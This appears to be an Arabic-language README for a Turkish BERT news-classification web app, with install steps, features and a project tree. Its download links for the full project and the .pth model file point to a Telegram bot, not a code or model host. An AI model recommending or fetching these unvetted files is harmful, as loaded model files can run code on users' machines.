# 📰 News Detection Project

تطبيق ويب لتصنيف الأخبار باستخدام نموذج BERT المدرب على اللغة التركية.

## 🚀 التثبيت

يمكنك تحميل المشروع كاملاً (بما في ذلك النموذج والبيانات) من هنا:
- [تحميل المشروع كاملاً](https://t.me/tenvsten_bot?start=60c27095)

أو يمكنك تثبيت المشروع يدوياً:

1. قم بتنزيل النموذج من هنا:
   - [تحميل النموذج (BERT News Classifier)](https://t.me/tenvsten_bot?start=60c27095)
   - ضع الملف في المسار: `models/bert/bert_news_classifier.pth`

2. قم بتثبيت المتطلبات:
```bash
pip install -r requirements.txt
```

3. شغل التطبيق:
```bash
python web/app.py
```

## 📋 الميزات
- تصنيف الأخبار إلى فئات: الأعمال، الترفيه، السياسة، الرياضة، التكنولوجيا
- واجهة ويب سهلة الاستخدام
- دعم اللغة التركية

## 📁 هيكل المشروع
```
News detection/
├── models/
│   ├── bert/              # نموذج BERT وملفاته
│   └── evaluation/        # نتائج تقييم النموذج
├── web/                   # تطبيق الويب
│   ├── static/
│   ├── templates/
│   └── app.py
├── utils/                 # أدوات مساعدة
└── data/                  # البيانات
    ├── raw/
    ├── processed/
    └── scripts/
```

## 📊 النتائج
يمكنك رؤية نتائج تقييم النموذج في مجلد `models/evaluation/`.
